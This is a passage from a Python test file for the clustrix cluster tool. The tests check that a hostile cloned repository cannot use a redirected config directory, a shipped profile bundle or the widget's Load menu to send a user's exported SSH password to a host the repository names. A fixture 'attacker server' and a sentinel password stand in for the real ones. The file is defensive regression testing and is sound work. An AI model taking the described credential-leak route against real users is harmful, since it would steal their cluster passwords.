            username="victim",
            ssh_host_key_policy="auto_add",
        )
    }
    manager.active_profile = name
    manager.save_to_file(str(path))
    return path


def test_a_profile_store_in_a_redirected_config_dir_never_receives_the_password(
    attacker_server, tmp_path, monkeypatch
):
    """The reproduction. RED before the fix: ``runtime``, and the leak.

    Measured before the fix: ``source=runtime``, ``trusted=True``, and
    ``server.authentications == [('victim', 'password')]`` -- the sentinel
    the victim exported in their own shell, on the wire to a host a
    repository named, with no ``config.yml`` involved at any point.
    """
    monkeypatch.setenv("SSH_PASSWORD", SENTINEL_PASSWORD)
    for name in ("SSH_HOST", "SSH_USERNAME", "SSH_PRIVATE_KEY_PATH"):
        monkeypatch.delenv(name, raising=False)
    credential_manager_module._credential_manager = None

    # The repository's .envrc, and the store it ships. Note the absence of a
    # config.yml: nothing here goes near _load_default_config.
    redirected = tmp_path / "cloned-repository" / "cfg"
    (redirected / "profiles").mkdir(parents=True)
    (redirected / "profiles" / "profiles.yml").write_text(
        _profile_bundle(attacker_server), encoding="utf-8"
    )
    monkeypatch.setenv("CLUSTRIX_CONFIG_DIR", str(redirected))
    assert not (redirected / "config.yml").exists()

    from clustrix.profile_manager import ProfileManager

    profile = ProfileManager().profiles["Cluster"]

    assert profile.cluster_host == attacker_server.host
    assert (
        get_config_source(profile) == config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR
    )
    assert stored_credential_is_for_config(profile, {"password": SENTINEL_PASSWORD})

    manager = ConnectionManager(profile)
    try:
        manager.setup_ssh_connection()
    except Exception:
        pass
    finally:
        manager.disconnect()

    assert attacker_server.authentications == [], (
        "an exported password went to a host named by a profile store in a "
        "config directory an environment variable chose: "
        + repr(attacker_server.authentications)
    )


def test_a_profile_store_in_the_real_config_dir_is_still_trusted(
    attacker_server, env_file
):
    """And the fix does not break the profile store it is gating.

    ``~/.clustrix/profiles/profiles.yml`` is a file the user put in their own
    configuration directory, which is the whole reason that directory is
    trusted. The positive case has to keep working or the rule is just a
    switch that turns profiles off.
    """
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    _write_profile_store(
        get_config_dir() / "profiles" / "profiles.yml", attacker_server
    )

    from clustrix.profile_manager import ProfileManager

    profile = ProfileManager().profiles["Cluster"]

    assert get_config_source(profile) == CONFIG_SOURCE_USER_CONFIG_DIR
    assert stored_credential_is_for_config(
        profile, {"password": SENTINEL_PASSWORD}
    ) is (None)

    manager = ConnectionManager(profile)
    try:
        manager.setup_ssh_connection()
        authenticated = manager.ssh_client.get_transport().is_authenticated()
    finally:
        manager.disconnect()
    assert authenticated
    assert attacker_server.authentications[-1] == ("victim", "password")


def test_a_profile_bundle_a_caller_named_is_an_explicit_file(tmp_path, attacker_server):
    """``load_from_file(path)`` and ``import_profile(path)`` are the caller's.

    Same rule as ``load_config``: naming a path is the choice the automatic
    search does not have. What must not happen is the *other* default --
    ``runtime`` -- which claims the user typed the hostname into Python.
    """
    from clustrix.profile_manager import ProfileManager

    bundle = tmp_path / "team-profiles.yml"
    bundle.write_text(_profile_bundle(attacker_server), encoding="utf-8")

    manager = ProfileManager()
    manager.load_from_file(str(bundle))
    assert get_config_source(manager.profiles["Cluster"]) == CONFIG_SOURCE_EXPLICIT_FILE

    single = tmp_path / "one-profile.yml"
    single.write_text(
        "cluster_type: ssh\ncluster_host: named.in.a.file\n", encoding="utf-8"
    )
    name = manager.import_profile(str(single))
    assert get_config_source(manager.profiles[name]) == CONFIG_SOURCE_EXPLICIT_FILE


def test_a_config_built_from_file_content_is_never_runtime():
    """The rule stated over every loader at once, so a new one is covered.

    ``ClusterConfig.load_from_file`` is the fourth reader of configuration
    off a disk and had the same defect as the profile store. The invariant
    is about the *content* -- a config built from bytes that were on a disk
    is not a config the user typed -- so it is asserted of the mechanism
    rather than of one caller.
    """
    from clustrix.config import config_built_from_file

    for index, source in enumerate(sorted(config_module.CONFIG_SOURCES)):
        # A hostname of its own per source: an untrusted source taints the
        # name for the rest of the process, so reusing one would have every
        # iteration after the first read back the earlier source.
        with config_built_from_file(source):
            built = ClusterConfig(
                cluster_type="ssh", cluster_host=f"host{index}.in.a.file.example"
            )
        assert get_config_source(built) == source

    # And the declaration does not outlive the block.
    assert get_config_source(ClusterConfig()) == CONFIG_SOURCE_RUNTIME

    with pytest.raises(ValueError, match="Unknown configuration source"):
        with config_built_from_file("something-nobody-decided-about"):
            pass  # pragma: no cover - the context manager raises on entry


def test_cluster_config_load_from_file_is_an_explicit_file(tmp_path):
    path = tmp_path / "somewhere.yml"
    path.write_text("cluster_type: ssh\ncluster_host: read.from.disk\n")

    assert (
        get_config_source(ClusterConfig.load_from_file(str(path)))
        == CONFIG_SOURCE_EXPLICIT_FILE
    )


# --------------------------------------------------------------------------
# A hostname the normaliser cannot make sense of.
# --------------------------------------------------------------------------


def test_a_hostname_that_cannot_be_normalised_is_refused_at_construction():
    """``cluster_host: 0x7f000001`` is parsed by PyYAML as an *int*.

    ``normalize_hostname`` answers ``""`` for anything that is not a
    non-empty string, and ``set_config_source`` skips a falsy key -- so a
    truthy-but-unnormalisable host was never written into the taint record
    at all, and the next rebuild laundered it to ``runtime``. It could not be
    compared against a credential either. Unrecordable and uncomparable is
    not a state to carry, so it fails closed at construction.
    """
    for host in [0x7F000001, 100000.0, "   ", ".", ["a"]]:
        with pytest.raises(ValueError, match="not a usable hostname"):
            ClusterConfig(cluster_type="ssh", cluster_host=host)
        with pytest.raises(ValueError, match="not a usable hostname"):
            configure(cluster_host=host)

    # A hostname that only *looks* numeric is fine once it is a string.
    assert ClusterConfig(cluster_type="ssh", cluster_host="127.0.0.1")
    # And so is not naming one at all.
    assert ClusterConfig(cluster_type="ssh", cluster_host=None)


def test_a_yaml_file_naming_an_unquoted_numeric_host_is_refused(tmp_path):
    path = tmp_path / "clustrix.yml"
    path.write_text("cluster_type: ssh\ncluster_host: 0x7f000001\n", encoding="utf-8")

    with pytest.raises(ValueError, match="not a usable hostname"):
        load_config(str(path))


def test_an_unnormalisable_hostname_is_untrusted_however_it_got_there():
    """The second lock, for an object that never ran ``__post_init__``.

    Nothing here should be reachable now that construction refuses the value
    -- which is exactly why it is asserted: "the map has nothing recorded
    against this host" must not read as "this host is fine".
    """
    config = ClusterConfig(cluster_type="ssh", cluster_host="real.example.edu")
    object.__setattr__(config, "cluster_host", 0x7F000001)

    assert not config_module.config_source_is_trusted(config)
    assert stored_credential_is_for_config(config, {"password": SENTINEL_PASSWORD})


def test_an_environment_password_is_not_offered_to_an_unnormalisable_host(monkeypatch):
    """``EnvironmentPasswordMethod`` returned the sentinel with success=True.

    The transport happened to die in ``getaddrinfo`` before anything left
    the machine, but the gate had already opened; a gate that relies on the
    next layer failing is not a gate.
    """
    from clustrix.auth_methods import EnvironmentPasswordMethod

    monkeypatch.setenv("SSH_PASSWORD", SENTINEL_PASSWORD)
    configure(
        cluster_type="ssh",
        cluster_host="real.example.edu",
        username="victim",
        use_env_password=True,
        password_env_var="SSH_PASSWORD",
    )
    object.__setattr__(get_config(), "cluster_host", 0x7F000001)

    result = EnvironmentPasswordMethod(get_config()).attempt_auth({})

    assert not result.success
    assert result.password != SENTINEL_PASSWORD
    assert result.password is None


# --------------------------------------------------------------------------
# Four invariants the code satisfies and nothing was asserting.
#
# Each of these survived a deliberate mutation of the shipped code with the
# whole suite green, which means the property was unguarded: a later
# refactor could take it away and nothing would say so. The mutation that
# each test kills is named in its docstring.
# --------------------------------------------------------------------------


def test_load_config_does_not_forget_that_a_host_was_untrusted(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """Kills: ``load_config`` clearing ``_HOSTS_NAMED_BY_UNTRUSTED_SOURCES``.

    The dangerous mutant. "Let ``load_config`` forget the taint" is exactly
    the friendly fix a maintainer reads the refusal and reaches for, and it
    reopens the laundering route with a green suite: the file the automatic
    search adopted is a file the caller can then name, and naming it would
    turn the repository's hostname back into the user's.

    Pointing ``load_config`` at the very file that was distrusted is the
    sharpest case, because the caller really did name a path -- and it is
    still not evidence that they chose the *host*, which arrived with the
    checkout.
    """
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    cloned_repository = tmp_path / "cloned-repository"
    cloned_repository.mkdir()
    hostile = cloned_repository / "clustrix.yml"
    hostile.write_text(_config_text(attacker_server), encoding="utf-8")
    monkeypatch.chdir(cloned_repository)
    with pytest.warns(UserWarning, match="current working directory"):
        config_module._load_default_config()

    recorded = dict(config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES)
    assert recorded == {attacker_server.host: CONFIG_SOURCE_WORKING_DIRECTORY}

    load_config(str(hostile))

    assert config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == recorded
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert stored_credential_is_for_config(
        get_config(), {"password": SENTINEL_PASSWORD}
    )

    authenticated = _attempt_connection()

    assert attacker_server.authentications == [], (
        "load_config() on the offending file cleared the record and the "
        "password went out: " + repr(attacker_server.authentications)
    )
    assert not authenticated


def test_a_symlinked_config_directory_is_the_directory_it_points_at(
    tmp_path, monkeypatch
):
    """Kills: comparing the two directories without ``realpath``.

    The commit message advertises a symlink-resolving comparison and nothing
    exercised it, because the isolated ``$HOME`` and ``CLUSTRIX_CONFIG_DIR``
    the suite runs under are already the same *string*. Here they are the
    same directory by two different names, which is the only arrangement
    that can tell the two implementations apart.

    Both directions matter and both are safe to allow: reaching
    ``~/.clustrix`` through a symlink, or ``~/.clustrix`` being one. Either
    way the redirect needs write access to the home directory, at which
    point provenance is not the problem.
    """
    real = pathlib.Path.home() / ".clustrix"
    real.mkdir(mode=0o700, parents=True, exist_ok=True)

    by_another_name = tmp_path / "link-to-config-dir"
    by_another_name.symlink_to(real, target_is_directory=True)
    monkeypatch.setenv("CLUSTRIX_CONFIG_DIR", str(by_another_name))
    assert config_module.config_dir_is_default()
    assert (
        config_module.config_source_for_discovered_path(
            by_another_name / "profiles" / "profiles.yml"
        )
        == CONFIG_SOURCE_USER_CONFIG_DIR
    )

    # ``..``, ``//`` and a trailing slash are the same directory too.
    monkeypatch.setenv("CLUSTRIX_CONFIG_DIR", f"{real}//../.clustrix/")
    assert config_module.config_dir_is_default()

    # A different directory is still a different directory.
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    monkeypatch.setenv("CLUSTRIX_CONFIG_DIR", str(elsewhere))
    assert not config_module.config_dir_is_default()
    assert (
        config_module.config_source_for_discovered_path(elsewhere / "profiles.yml")
        == config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR
    )


def test_the_record_is_read_through_the_same_normalisation_it_is_written_with(
    tmp_path, monkeypatch
):
    """Kills: looking the hostname up in the record without normalising it.

    Normalisation was pinned on the *record* side only -- the existing test
    writes ``Named.By.The.Repository.`` and looks up the lower-case form, so
    an un-normalised lookup still finds the key the normalised write left
    behind. The asymmetry only shows in the other direction: a file that
    names the plain form, and code that then spells it with the capitals and
    the trailing dot DNS does not treat as significant.

    Both ends must go through one normaliser or the record answers a
    different question from the one it was asked.
    """
    project = tmp_path / "project"
    project.mkdir()
    (project / "clustrix.yml").write_text(
        "cluster_type: ssh\ncluster_host: named.by.the.repository\n", encoding="utf-8"
    )
    monkeypatch.chdir(project)
    with pytest.warns(UserWarning):
        config_module._load_default_config()

    for spelling in [
        "Named.By.The.Repository.",
        "NAMED.BY.THE.REPOSITORY",
        "  named.by.the.repository  ",
        "named.by.the.repository.",
    ]:
        fresh = ClusterConfig(cluster_type="ssh", cluster_host=spelling)
        assert get_config_source(fresh) == CONFIG_SOURCE_WORKING_DIRECTORY, spelling
        assert stored_credential_is_for_config(
            fresh, {"password": SENTINEL_PASSWORD}
        ), spelling


def test_a_redirected_config_directory_taints_the_hostname_too(
    attacker_server, tmp_path, monkeypatch
):
    """Kills: recording only ``working-directory`` in the taint map.

    ``set_config_source`` records every source in ``UNTRUSTED_CONFIG_SOURCES``
    and the code is right, but only the working-directory half was under
    test: narrowing the record to that one constant left the whole suite
    green while ``redirected-config-dir`` became launderable by any rebuild
    -- the widget's Apply button among them.
    """
    monkeypatch.setenv("SSH_PASSWORD", SENTINEL_PASSWORD)
    for name in ("SSH_HOST", "SSH_USERNAME", "SSH_PRIVATE_KEY_PATH"):
        monkeypatch.delenv(name, raising=False)
    credential_manager_module._credential_manager = None

    redirected = tmp_path / "cloned-repository" / "attacker-config"
    redirected.mkdir(parents=True)
    (redirected / "config.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )
    monkeypatch.setenv("CLUSTRIX_CONFIG_DIR", str(redirected))
    with pytest.warns(UserWarning, match="CLUSTRIX_CONFIG_DIR"):
        config_module._load_default_config()

    assert config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == {
        attacker_server.host: config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR
    }

    from dataclasses import asdict

    configure(**asdict(get_config()))

    assert (
        get_config_source(get_config())
        == config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR
    )

    authenticated = _attempt_connection()

    assert attacker_server.authentications == [], (
        "a round trip through configure() re-marked a redirected-config-dir "
        "host as trusted: " + repr(attacker_server.authentications)
    )
    assert not authenticated


# --------------------------------------------------------------------------
# The software and its own messages have to agree.
#
# Four texts told the user to fix a refusal with ``configure(cluster_host=
# ...)`` or ``load_config(path)``. Neither works and neither can: the
# notebook widget's Apply button *is* ``configure(cluster_host=<the file's
# host>, ...)``, so a rule that let an explicit configure() clear the taint
# would reopen the laundering route, and nothing distinguishes the two
# calls. So the taint stays permanent and the messages name what works.
# --------------------------------------------------------------------------


def _remedy_texts(path):
    """Every message that tells a user how to fix an untrusted hostname."""
    with warnings.catch_warnings(record=True) as raised:
        warnings.simplefilter("always")
        config_module._load_default_config()
    config = get_config()
    config_module.set_config_source(config, CONFIG_SOURCE_WORKING_DIRECTORY)
    refusal = stored_credential_is_for_config(config, {"password": SENTINEL_PASSWORD})
    assert refusal
    return [str(w.message) for w in raised] + [refusal]


def test_no_message_offers_a_remedy_that_does_not_work(tmp_path, monkeypatch):
    """Verified dead: ``configure(cluster_host=H)`` and ``load_config(f)``.

    Both were measured leaving the source at ``working-directory`` and the
    credential refused, while four texts recommended them. A message that
    names an action which does not change the outcome is worse than no
    message: it sends the reader round a loop.
    """
    project = tmp_path / "project"
    project.mkdir()
    (project / "clustrix.yml").write_text(
        "cluster_type: ssh\ncluster_host: named.by.the.repository\n", encoding="utf-8"
    )
    monkeypatch.chdir(project)

    texts = _remedy_texts(project / "clustrix.yml")
    assert texts

    for text in texts:
        assert "configure(cluster_host=" not in text or "does not clear it" in text, (
            "a message still recommends configure(cluster_host=...), which "
            "leaves the host refused: " + text
        )
        # Each text has to name at least one remedy that was measured to work.
        assert "SSH_HOST" in text, text

    # And the recommendation is measured, not asserted: naming the same host
    # through either route leaves it exactly where it was.
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY
    configure(cluster_host="named.by.the.repository")
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY
    load_config(str(project / "clustrix.yml"))
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY


def test_the_remedy_the_messages_name_actually_releases_the_credential(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """``SSH_HOST`` in the credential file is the escape, end to end.

    The other one -- remove the file and start a new process -- is what a
    fresh interpreter does by definition, and the record being per-process
    is asserted by the conftest fixture that clears it between tests.

    The host key is trusted deliberately, for the same reason as the test
    above: the working-directory file may no longer turn verification off,
    so a refusal here has to be a refusal about the *credential*.
    """
    _the_host_is_already_known(attacker_server)
    cloned_repository = tmp_path / "cloned-repository"
    cloned_repository.mkdir()
    (cloned_repository / "clustrix.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )
    monkeypatch.chdir(cloned_repository)

    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)
    with pytest.warns(UserWarning, match="current working directory"):
        config_module._load_default_config()
    assert not _attempt_connection()
    assert attacker_server.authentications == []

    # The user reads the message and names the host that may have the secret.
    env_file(SSH_HOST=attacker_server.host, SSH_PASSWORD=SENTINEL_PASSWORD)

    assert _attempt_connection() is True
    assert attacker_server.authentications[-1] == ("victim", "password")


def test_configure_names_asdict_when_it_is_handed_an_internal_attribute():
    """``configure(**config.__dict__)`` names a thing the user never typed.

    Refusing is right -- the provenance record is the one claim a caller
    must not be able to make about itself -- but "Unknown configuration
    parameter: _clustrix_config_source" sends the reader looking for a
    setting that does not exist instead of at the splat that produced it.
    """
    with pytest.raises(ValueError, match="Unknown configuration parameter") as raised:
        configure(**ClusterConfig().__dict__)

    assert "asdict" in str(raised.value)
    assert "__dict__" in str(raised.value)


# --------------------------------------------------------------------------
# The widget's Load menu is a *discovery*, not a choice.
#
# ``_discover_config_files`` globs ``Path.cwd()`` for any *.yml/*.yaml/*.json
# holding a ``profiles:`` mapping and offers it in the Load dropdown, so a
# bundle a cloned repository ships appears there without the user having gone
# looking for it. ``_on_load_config`` then called ``load_from_file(filename)``
# on the default ``explicit-file`` -- the trusted end of the scale, meaning
# "the user named this path". Measured before the fix: ``source=explicit-file
# trusted=True`` and the sentinel on the wire to the repository's host.
# --------------------------------------------------------------------------


def _widget_loading(filename):
    """Drive the real Load button with ``filename`` in the real Combobox."""
    from clustrix.modern_notebook_widget import ModernClustrixWidget

    widget = ModernClustrixWidget()
    widget.widgets["config_filename"].value = filename
    widget._on_load_config(None)
    return widget


def test_the_load_menu_does_not_trust_a_bundle_found_in_the_working_directory(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """The reproduction. RED before the fix: ``explicit-file``, and the leak."""
    pytest.importorskip("ipywidgets")
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    repo = tmp_path / "cloned-repository"
    repo.mkdir()
    (repo / "profiles.yml").write_text(
        _profile_bundle(attacker_server), encoding="utf-8"
    )
    monkeypatch.chdir(repo)

    from clustrix.modern_notebook_widget import ModernClustrixWidget

    # The menu really does offer it, by full path, without being asked.
    offered = ModernClustrixWidget()._discover_config_files()
    chosen = [entry for entry in offered if entry == str(repo / "profiles.yml")]
    assert chosen, f"the working-directory bundle was not offered: {offered}"

    widget = _widget_loading(chosen[0])
    profile = widget.profile_manager.get_active_profile()

    assert profile.cluster_host == attacker_server.host
    assert (
        get_config_source(profile) == config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR
    )
    assert stored_credential_is_for_config(profile, {"password": SENTINEL_PASSWORD})

    manager = ConnectionManager(profile)
    try:
        manager.setup_ssh_connection()
    except Exception:
        pass
    finally:
        manager.disconnect()

    assert attacker_server.authentications == [], (
        "the widget's Load menu sent the cluster password to a host named by "
        "a profile bundle it found in the working directory: "
        + repr(attacker_server.authentications)
    )


def test_the_load_menu_still_trusts_the_store_in_the_configuration_directory(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """And the fix does not turn Load into a button that refuses everything.

    A bare ``profiles.yml`` resolves to the clustrix configuration directory,
    which is where Save puts it. That is the documented round trip and it has
    to keep authenticating.
    """
    pytest.importorskip("ipywidgets")
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    _write_profile_store(get_config_dir() / "profiles.yml", attacker_server)
    monkeypatch.chdir(tmp_path)

    widget = _widget_loading("profiles.yml")
    profile = widget.profile_manager.get_active_profile()

    assert get_config_source(profile) == CONFIG_SOURCE_USER_CONFIG_DIR
    assert (
        stored_credential_is_for_config(profile, {"password": SENTINEL_PASSWORD})
        is None
    )

    manager = ConnectionManager(profile)
    try:
        manager.setup_ssh_connection()
        authenticated = manager.ssh_client.get_transport().is_authenticated()
    finally:
        manager.disconnect()
    assert authenticated
    assert attacker_server.authentications[-1] == ("victim", "password")


# --------------------------------------------------------------------------
# The declaration must not be lost by delegating construction elsewhere.
#
# ``_CONFIG_SOURCE_BEING_READ`` is a ContextVar, and a new thread starts from
# an empty context: it reads the default, ``runtime``, which is *trusted*. So
# a loader that built its configs on a worker thread would hand back a file's
# hostname marked as somebody's Python. Latent -- no shipped loader does it --
# but so did the profile store look before it was found.
# --------------------------------------------------------------------------


def _built_in_a_thread(host):
    import threading

    built = {}

    def build():
        built["config"] = ClusterConfig(cluster_type="ssh", cluster_host=host)

    thread = threading.Thread(target=build)
    thread.start()
    thread.join()
    return built["config"]


def test_a_loader_that_builds_on_a_worker_thread_still_produces_a_file_config():
    """RED before the fix: ``runtime``, i.e. trusted."""
    from clustrix.config import config_built_from_file

    with config_built_from_file(config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR):
        built = _built_in_a_thread("delegated.to.a.worker.thread.example")

    assert (
        get_config_source(built) == config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR
    ), "a config a loader built on a worker thread came back trusted"


def test_a_thread_outside_every_read_is_still_somebody_s_python():
    """The guard must not make every threaded construction untrusted."""
    assert (
        get_config_source(_built_in_a_thread("typed.on.a.worker.thread.example"))
        == CONFIG_SOURCE_RUNTIME
    )


def test_an_inner_declaration_still_wins_over_an_outer_one():
    """The process-wide record is consulted only when nothing is declared."""
    from clustrix.config import config_built_from_file

    with config_built_from_file(config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR):
        with config_built_from_file(CONFIG_SOURCE_EXPLICIT_FILE):
            built = ClusterConfig(
                cluster_type="ssh", cluster_host="named.inside.a.nested.block.example"
            )
    assert get_config_source(built) == CONFIG_SOURCE_EXPLICIT_FILE


def test_the_process_wide_record_does_not_outlive_the_read():
    """Including when the read raises: a permanent record would taint the
    whole process, which is the mirror-image failure."""
    from clustrix.config import config_built_from_file

    assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {}
    with config_built_from_file(config_module.CONFIG_SOURCE_WORKING_DIRECTORY):
        with config_built_from_file(config_module.CONFIG_SOURCE_WORKING_DIRECTORY):
            assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {
                config_module.CONFIG_SOURCE_WORKING_DIRECTORY: 2
            }
    assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {}

    with pytest.raises(RuntimeError):
        with config_built_from_file(config_module.CONFIG_SOURCE_WORKING_DIRECTORY):
            raise RuntimeError("the read failed")
    assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {}
    assert get_config_source(ClusterConfig()) == CONFIG_SOURCE_RUNTIME


#: Names that, appearing in a module which declares configuration reads,
#: mean somebody has started handing work to another *process*.
DELEGATING_NAMES = frozenset(
    {
        "multiprocessing",
        "ProcessPoolExecutor",
        "billiard",
        "loky",
        "joblib",
    }
)


def _delegating_names(text):
    """Which of :data:`DELEGATING_NAMES` this source refers to.

    Over the abstract syntax tree rather than the text, so prose naming
    ``ProcessPoolExecutor`` is not itself a finding.

    An ``Attribute`` counts only when the thing it hangs off is a module
    path -- ``futures.ProcessPoolExecutor``,
    ``concurrent.futures.ProcessPoolExecutor``. ``self.joblib`` and
    ``self.multiprocessing`` are a method and an attribute of the object, so
    a module that happened to define ``def joblib(self)`` failed this check
    while delegating nothing anywhere.
    """
    import ast

    referenced = set()
    for node in ast.walk(ast.parse(text)):
        if isinstance(node, ast.Name):
            referenced.add(node.id)
        elif isinstance(node, ast.Attribute):
            root = node.value
            while isinstance(root, ast.Attribute):
                root = root.value
            if isinstance(root, ast.Name) and root.id not in ("self", "cls"):
                referenced.add(node.attr)
        elif isinstance(node, ast.Import):
            referenced.update(a.name.split(".")[0] for a in node.names)
        elif isinstance(node, ast.ImportFrom):
            referenced.add((node.module or "").split(".")[0])
            referenced.update(a.name for a in node.names)
    return referenced & DELEGATING_NAMES


def test_no_declaring_module_has_started_delegating_to_another_process():
    """A regression canary, and deliberately **not** a control.

    A ``spawn``ed child starts a fresh interpreter: it has neither the
    ContextVar nor the process-wide record, so a ``ClusterConfig`` it builds
    for a loader in the parent reads ``runtime``. Nothing inside one
    interpreter can follow a declaration across that boundary, so the only
    available defence is that no shipped loader crosses it.

    **What this does not do.** It is a name check, and a name check is
    evaded by anything that does not spell the name:
    ``importlib.import_module("multi" + "processing")``, ``__import__``, a
    re-export shim, a pool handed in as an argument, and -- the same
    interpreter boundary by a different door, entirely unguarded here --
    ``subprocess.run`` or ``os.fork`` followed by an exec. So it detects
    "somebody added multiprocessing to config.py", which is the realistic
    regression, and it detects nothing an adversary does on purpose. Do not
    cite it as a guarantee that the boundary is closed; it is not one.

    It does correctly ignore prose, ``ThreadPoolExecutor`` (a thread stays
    inside this interpreter and is covered by the process-wide record), and
    modules that declare no reads at all.
    """
    package = pathlib.Path(config_module.__file__).parent

    offenders = {}
    for path in sorted(package.glob("*.py")):
        text = path.read_text(encoding="utf-8")
        if "config_built_from_file" not in text:
            continue
        found = _delegating_names(text)
        if found:
            offenders[path.name] = sorted(found)

    assert not offenders, (
        "a module that declares configuration reads now also delegates work "
        "to another process; a ClusterConfig built there would come back "
        "marked runtime, i.e. trusted: " + repr(offenders)
    )


def test_the_canary_does_not_fire_on_a_method_of_the_object_itself():
    """Kills: matching every ``ast.Attribute.attr`` regardless of its root.

    A canary that cries at ``def joblib(self)`` is a canary somebody deletes.
    """
    assert (
        _delegating_names(
            "class Loader:\n"
            "    def joblib(self):\n"
            "        return self.multiprocessing\n"
        )
        == set()
    )

    # And it still sees the real thing, spelled either way.
    assert _delegating_names(
        "from concurrent import futures\nfutures.ProcessPoolExecutor()\n"
    ) == {"ProcessPoolExecutor"}
    assert _delegating_names("import concurrent.futures\n") == set()
    assert _delegating_names("import multiprocessing\n") == {"multiprocessing"}
    assert _delegating_names("import multiprocessing.pool as p\np.Pool()\n") == {
        "multiprocessing"
    }

    # A thread stays inside this interpreter, so it is not a finding.
    assert (
        _delegating_names(
            "from concurrent.futures import ThreadPoolExecutor\n"
            "ThreadPoolExecutor()\n"
        )
        == set()
    )


def test_the_documented_remedy_names_a_file_the_reader_controls():
    """``<config dir>/.env`` is the attacker's directory under a redirect.

    The placeholder is correct where the docs describe *where clustrix
    looks*, and wrong in the sentence that tells a reader which file
    authorises a host: ``CLUSTRIX_CONFIG_DIR`` is exactly the thing a hostile
    repository sets, so the remedy would have pointed at a file the
    redirector controls. Quickstart already spelled it out; the two pages
    have to say the same thing.
    """
    docs = pathlib.Path(__file__).resolve().parents[2] / "docs" / "source"
    configuration = (docs / "configuration.rst").read_text(encoding="utf-8")
    quickstart = (docs / "quickstart.rst").read_text(encoding="utf-8")

    assert "``<config dir>/.env``" not in configuration
    assert "``~/.clustrix/.env``" in configuration
    assert "``~/.clustrix/.env``" in quickstart


# --------------------------------------------------------------------------
# A momentary overlap must not deny the documented workflow forever.
#
# The process-wide record of untrusted reads was consulted by
# ``__post_init__`` and its answer written straight into
# ``_HOSTS_NAMED_BY_UNTRUSTED_SOURCES``, which is append-only and has no
# clearing API by design. So a ``ClusterConfig(cluster_host=...)`` on one
# thread that merely *overlapped* an unrelated untrusted read on another came
# out untrusted **and** poisoned that hostname for the life of the process:
# every later config naming it was refused, ``configure()`` could not clear
# it, and the refusal message named remedies unrelated to the cause. Measured
# at 164,509 of 164,516 constructions over-tainted in the review, 96,739 of
# 96,740 here -- and a generator abandoned mid-block reproduces it with no
# threads at all, because a ContextVar set inside a suspended generator stays
# set in the caller's context.
#
# The separation: a *construction* may conclude "I cannot prove my origin, so
# treat me as untrusted" -- one object, one refusal, undone by building
# another. Only a *loader*, holding the file it just read, may conclude "this
# hostname came off a disk" and refuse it process-wide.
# --------------------------------------------------------------------------


def _plain_construction_is_trusted(host):
    """Would a fresh, ordinary ``ClusterConfig(host)`` be trusted now?"""
    return config_module.config_source_is_trusted(
        ClusterConfig(cluster_type="ssh", cluster_host=host)
    )


def test_an_unrelated_read_elsewhere_does_not_deny_the_host_for_the_process():
    """RED before the fix: the host is refused forever afterwards.

    Twelve threads opening and closing an untrusted read that has nothing to
    do with this hostname, twelve threads doing nothing but constructing a
    config that names it. Constructions that land inside the overlap are
    untrusted, which is the conservative and correct call for an object whose
    origin cannot be established. What must not survive the overlap is the
    *hostname*: the whole point of the record is that it cannot be cleared,
    so writing a guess into it permanently denies the user their own cluster.
    """
    import threading
    import time

    host = "my.real.cluster.example"
    assert config_module.normalize_hostname(host) not in (
        config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES
    )

    stop = threading.Event()
    counts = []

    def reader():
        while not stop.is_set():
            with config_module.config_built_from_file(CONFIG_SOURCE_WORKING_DIRECTORY):
                pass

    def builder():
        built = 0
        while not stop.is_set():
            ClusterConfig(cluster_type="ssh", cluster_host=host)
            built += 1
        counts.append(built)

    threads = [threading.Thread(target=reader) for _ in range(12)]
    threads += [threading.Thread(target=builder) for _ in range(12)]
    for thread in threads:
        thread.start()
    time.sleep(0.75)
    stop.set()
    for thread in threads:
        thread.join(30)

    assert sum(counts) > 0, "the race did not actually construct anything"
    assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {}
    assert config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == {}, (
        "an unrelated untrusted read on another thread wrote a hostname into "
        "the permanent record, which nothing can clear"
    )
    assert _plain_construction_is_trusted(
        host
    ), "a hostname the user typed is refused after a benign overlap ended"

    configure(cluster_host=host, cluster_type="ssh")
    assert config_module.config_source_is_trusted(
        get_config()
    ), "configure() cannot recover a host poisoned by an unrelated read"


def test_an_abandoned_generator_does_not_deny_the_host_for_the_process():
    """The no-threads reproduction.

    ``ContextVar.set`` inside a generator body is *not* scoped to the
    generator frame -- PEP 550/568 were never adopted -- so a generator that
    suspends inside ``config_built_from_file`` leaves the declaration set in
    whoever called ``next()``. Every construction in that caller then looks
    declared, which is a stale fact rather than a guess, and under the old
    rule it wrote the hostname into the permanent record. Distrusting the
    objects built during the suspension is right; refusing the hostname after
    the generator is gone is not.
    """
    import gc

    host = "my.other.real.cluster.example"

    def suspended():
